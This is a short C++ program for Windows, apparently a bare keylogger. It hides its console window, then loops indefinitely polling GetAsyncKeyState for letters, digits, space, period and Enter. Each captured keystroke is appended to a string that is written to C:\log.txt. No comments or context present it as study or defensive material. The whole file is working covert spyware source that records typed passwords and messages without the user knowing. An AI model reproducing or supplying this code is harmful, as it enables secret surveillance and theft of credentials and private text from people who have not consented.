#include <windows.h>
#include <iostream>        
#include <fstream>         
#include <string>

using namespace std;

int main() {
    FreeConsole();   
     
    string keys;    
 
    while(1==1) {  
      if(GetAsyncKeyState(0x41)) {      
           cout << "a";                
           keys+= "a";    
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x42)) {
           cout << "b";
           keys+= "b";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x43)) {
           cout << "c";
           keys+= "c";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x44)) {
           cout<<"d";
           keys+="d";
           Sleep(200);                      
      }; 
      if(GetAsyncKeyState(0x45)) {
           cout<<"e";
           keys+="e";
           Sleep(200);                      
      };      
     
      if(GetAsyncKeyState(0x46)) {
           cout<<"f";
           keys+="f";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x47)) {
           cout<<"g";
           keys+="g";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x48)) {
           cout<<"h";
           keys+="h";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x49)) {
           cout<<"i";
           keys+="i";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4a)) {
           cout<<"j";
           keys+="j";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4b)) {
           cout<<"k";
           keys+="k";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4c)) {
           cout<<"l";
           keys+="l";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4d)) {
           cout<<"m";
           keys+="m";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4e)) {
           cout<<"n";
           keys+="n";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4f)) {
           cout<<"o";
           keys+="o";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x50)) {
           cout<<"p";
           keys+="p";
           Sleep(200);                      
      }; 
      if(GetAsyncKeyState(0x51)) {
           cout<<"q";
           keys+="q";
           Sleep(200);                      
      };  
      if(GetAsyncKeyState(0x52)) {
           cout<<"r";
           keys+="r";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x53)) {
           cout<<"s";
           keys+="s";
           Sleep(200);                      
      };  
      if(GetAsyncKeyState(0x54)) {
           cout<<"t";
           keys+="t";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x55)) {
           cout<<"u";
           keys+="u";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x56)) {
           cout<<"v";
           keys+="v";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x57)) {
           cout<<"w";
           keys+="w";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x58)) {
           cout<<"x";
           keys+="x";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x59)) {
           cout<<"y";
           keys+="y";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x5A)) {
           cout<<"z";
           keys+="z";
           Sleep(200);                      
      }; 
      if(GetAsyncKeyState(VK_SPACE)) {
           cout<<" ";
           keys+=" ";
           Sleep(200);                      
      }; 
      if(GetAsyncKeyState(0x6E)) {
           cout<<".";
           keys+=".";
           Sleep(200);                      
      }; 
      if(GetAsyncKeyState(0x0d)) {
           cout<<"/n";
           keys+="<br>";
           Sleep(200);
      };
      if(GetAsyncKeyState(0x30)) {
           cout<<"0";
           keys+="0";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x31)) {
           cout<<"1";
           keys+="1";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x32)) {
           cout<<"2";
           keys+="2";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x33)) {
           cout<<"3";
           keys+="3";
           Sleep(200);                      
      };       
      if(GetAsyncKeyState(0x34)) {
           cout<<"4";
           keys+="4";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x35)) {
           cout<<"5";
           keys+="5";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x36)) {
           cout<<"6";
           keys+="6";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x37)) {
           cout<<"7";
           keys+="7";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x38)) {
           cout<<"8";
           keys+="8";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x39)) {
           cout<<"9";
           keys+="9";
           Sleep(200);                      
      };
      

  ofstream myfile;      
  myfile.open ("C:\\log.txt");       
  myfile << keys;                        
  myfile.close();                         

	};
}
